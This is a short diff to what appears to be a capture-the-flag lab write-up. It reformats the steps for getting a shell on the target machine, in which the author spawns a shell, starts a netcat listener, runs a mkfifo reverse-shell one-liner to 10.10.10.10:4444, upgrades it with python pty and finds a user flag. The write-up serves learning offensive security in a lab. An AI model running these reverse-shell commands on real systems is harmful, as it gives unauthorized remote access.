@@ -76,11 +76,13 @@ The job control is turned off so i couldn't spawn interactive shell no matter wh
 - `perl —e 'exec "/bin/sh";'`
 
 In that case, i opened `netcat` listner on port 4444 and executed reverse shell on the `pseudo shell`<br>
-`nc -lvnp 4444` (listener)<br>
-`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f` (reverse shell)<br>
+- `nc -lvnp 4444` (listener)
+ `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f` (reverse shell)<br>
+
 
 Having reverse shell from `nc`, i upgraded to `interactive shell`<br>
 `python3 -c 'import pty; pty.spawn("/bin/sh")'`
+
 
 There was only 1 directory inside `/home` called `james` (which is who we are - `whoami`)<br>
 The user flag can be found inside `/home/james/user.txt`<br>
